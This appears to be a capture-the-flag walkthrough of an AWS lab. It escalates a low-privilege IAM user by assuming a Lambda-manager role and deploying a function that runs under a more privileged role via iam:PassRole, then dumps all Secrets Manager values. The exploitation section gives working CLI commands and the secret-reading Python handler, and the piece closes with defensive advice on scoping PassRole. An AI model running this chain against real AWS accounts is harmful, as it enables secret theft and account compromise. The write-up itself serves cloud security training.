$ cat assume.md

Hack Smarter · Easy · AWS / cloud

Another pure AWS IAM box — CLI only, no VPN, no shells. You start with low-priv keys for a user who can't read Secrets Manager, and the escalation rides on two over-scoped IAM actions. The chain: read your own policy to find sts:AssumeRole on * -> enumerate roles and find one that trusts you and one that trusts only Lambda -> the assumable role holds iam:PassRole on * plus full Lambda -> the Lambda-only role is the one that can read the secret -> so deploy a function and pass it the privileged role as its execution role, letting the function read the flag for you. A classic PassRole -> Lambda privilege escalation.

AWS keys and the STS session token below are redacted — Hack Smarter's hard rule for cloud walkthroughs, and a good habit anyway (live-looking keys in a public repo trip Amazon's automated scanners). Everything else is the intended path.

$ setup

Wire the given keys into a named profile and check the objective first — and, as the username hints, it's denied: 

aws configure --profile chris         # keys, us-east-1, json
aws sts get-caller-identity --profile chris
# Arn: arn:aws:iam::<ACCOUNT>:user/chris-lab

aws secretsmanager list-secrets --profile chris --region us-east-1
# AccessDeniedException  (no ListSecrets, as expected)

$ read your own policy

chris can read IAM. His attached policy is the whole map — and it's loud: 

aws iam get-policy-version \
  --policy-arn arn:aws:iam::$ACCT:policy/cg-chris-policy-lab \
  --version-id v1 --profile chris
{
  "Action": [ "sts:AssumeRole", "iam:List*", "iam:Get*" ],
  "Effect": "Allow",
  "Resource": "*"
}

sts:AssumeRole on Resource: "*". chris can assume any role in the account — provided the role's own trust policy lets him. That flips the question from "what can chris do" to "which role will accept chris?"

$ enumerate the roles

Two custom roles stand out from the service-linked noise (filter for the CloudGoat cg- prefix). Read both trust policies — this is the crux of the box: 

aws iam list-roles --profile chris \
  --query "Roles[?starts_with(RoleName,'cg-')].RoleName"
# cg-lambdaManager-role-lab
# cg-debug-role-lab

aws iam get-role --role-name cg-lambdaManager-role-lab --profile chris \
  --query "Role.AssumeRolePolicyDocument"
# Principal: { "AWS": ".../user/chris-lab" }         <- trusts chris

aws iam get-role --role-name cg-debug-role-lab --profile chris \
  --query "Role.AssumeRolePolicyDocument"
# Principal: { "Service": "lambda.amazonaws.com" }   <- trusts Lambda only

So chris can assume lambdaManager directly, but debug — the role that turns out to hold access to the secret — can only ever be assumed by a Lambda function. That fence is the puzzle: to become debug, something has to run as debug, and only Lambda qualifies.

$ the privesc primitive

lambdaManager's policy is the lever. Full Lambda, and iam:PassRole on everything: 

aws iam get-policy-version \
  --policy-arn arn:aws:iam::$ACCT:policy/cg-lambdaManager-policy-lab \
  --version-id v1 --profile chris
# { "Action": [ "lambda:*", "iam:PassRole" ], "Resource": "*" }

iam:PassRole is the action that lets a principal hand a role to an AWS service. Scoped to *, it means lambdaManager can attach any role — including debug — to a Lambda function as its execution role. Paired with lambda:CreateFunction and lambda:InvokeFunction, that's a full escalation into debug's permissions. In production you scope PassRole to the specific roles a service is allowed to run as; * hands over everything.

$ exploitation

Assume lambdaManager and switch into its session: 

aws sts assume-role \
  --role-arn arn:aws:iam::$ACCT:role/cg-lambdaManager-role-lab \
  --role-session-name pwn --profile chris
# Credentials: AccessKeyId / SecretAccessKey / SessionToken

export AWS_ACCESS_KEY_ID=<REDACTED>
export AWS_SECRET_ACCESS_KEY=<REDACTED>
export AWS_SESSION_TOKEN=<REDACTED>
aws sts get-caller-identity
# Arn: .../assumed-role/cg-lambdaManager-role-lab/pwn

Write a few lines of Python that read every secret, zip it, and deploy it — crucially, with cg-debug-role-lab as the --role. The function inherits debug's Secrets Manager access: 

cat > lambda_function.py <<'EOF'
import boto3
def lambda_handler(event, context):
    sm = boto3.client('secretsmanager')
    out = {}
    for s in sm.list_secrets()['SecretList']:
        out[s['Name']] = sm.get_secret_value(SecretId=s['Name'])['SecretString']
    return out
EOF
zip function.zip lambda_function.py

aws lambda create-function --function-name pwn --runtime python3.12 \
  --role arn:aws:iam::$ACCT:role/cg-debug-role-lab \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip --region us-east-1

aws lambda invoke --function-name pwn --region us-east-1 response.json
cat response.json
If create-function returns The role defined for the function cannot be assumed by Lambda, that's IAM propagation lag — wait ~10 s and re-run the same command. Remember the STS session env vars don't carry between terminals, and neither does $ACCT — re-export them in whatever shell you run the deploy from.

$ flag

aws lambda invoke --function-name pwn --region us-east-1 response.json
cat response.json
# { "cg-...-flag": "<the flag string>" }

The function ran with debug's identity, read a secret chris was never allowed to touch, and handed it back — full account compromise from a user who couldn't even call ListSecrets.

$ takeaway

  • PassRole is a privilege-escalation primitive, not plumbing. The right to hand a role to a service is the right to become that role's permissions, as long as you also control something that service runs — Lambda, EC2, ECS, Glue. iam:PassRole on * next to lambda:* is game over.
  • A trust policy that names a service is still a door. debug trusting only lambda.amazonaws.com looks locked down — no human can assume it. But anyone who can create a Lambda and pass the role walks right in. Restricting who can assume a role means little if the service it trusts is one you can drive.
  • Scope PassRole tightly. Grant it only for the exact execution roles a principal legitimately needs, via explicit resource ARNs and ideally an iam:PassedToService condition. Never Resource: "*".
  • In AWS, enumeration is the exploit. There was nothing to overflow or crack — the whole box was reading three policy documents and two trust relationships and noticing which grants were too wide.
